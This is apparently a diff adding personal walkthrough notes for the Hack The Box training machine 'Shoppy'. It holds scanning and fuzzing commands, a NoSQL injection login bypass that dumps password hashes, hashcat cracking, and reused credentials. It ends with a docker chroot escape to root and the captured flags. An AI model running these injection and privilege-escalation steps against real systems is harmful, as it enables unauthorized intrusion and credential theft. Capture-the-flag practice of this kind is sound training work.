@@ -1,0 +1,73 @@
+nmap -T4 -p- -A 10.10.11.180 -oN shoppy
+	22/ssh
+	80/http
+	9093/http
+
+Add shoppy.htb to /etc/hosts
+
+gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o shoppy-gobuster
+
+Launch burp suite
+	get a capture of a login attempt
+		send it to Intruder
+			use a password list and try to brute force with admin as username
+				no results
+
+Try using FUZZ instead
+	ffuf -u http://shoppy.htb/login -c -w /usr/share/wordlists/SecLists/Fuzzing/Databases/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'
+		enter - admin' || 'a'=='a into the username field and leave password field blank
+			loads a page with a search box - enter the - admin' || 'a'=='a - into the search field
+				a json file opens up with usernames and password hashs
+					{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}
+					{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}
+ 
+using hashcat to crack the hashes
+	hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+		hash for josh is cracked
+			6ebcea65320589ca4f2f1ce039975995:remembermethisway
+
+login to the site as josh
+	nothing new
+	
+try FUZZ again to find subdomains
+	ffuf -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shoppy.htb" -fs 169
+		alpblog
+		mattermost
+			add mattermost to /etc/hosts
+				echo "10.10.11.180 mattermost.shoppy.htb" >> /etc/hosts
+				
+navigate to mattermost.shoppy.htb
+	it is a login page
+		login with username-josh password-remembermethisway
+			
+found another set of credentials 
+	jaeger - ShOppyBest@pp!
+	
+use those creds to ssh into server
+
+locate user.txt
+	f8a9d5a67aeb3d29e95dece755d2ef08
+	
+sudo -l
+	/home/deploy/password-manager
+	
+navigate to /home/deploy
+	theres a file called creds.txt
+		it has more credentials 
+			username-deploy
+			password-Deploying@pp!
+			
+ssh with the new creds
+	sudo -l 
+		no luck
+		
+check what group we are in 
+	groups
+		docker
+		
+go to gtfobins and see we can spawn a root shell with docker
+	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+		
+cat /root/root.txt
+	a3c977f2fabd3b048674884573f26c5e
+	
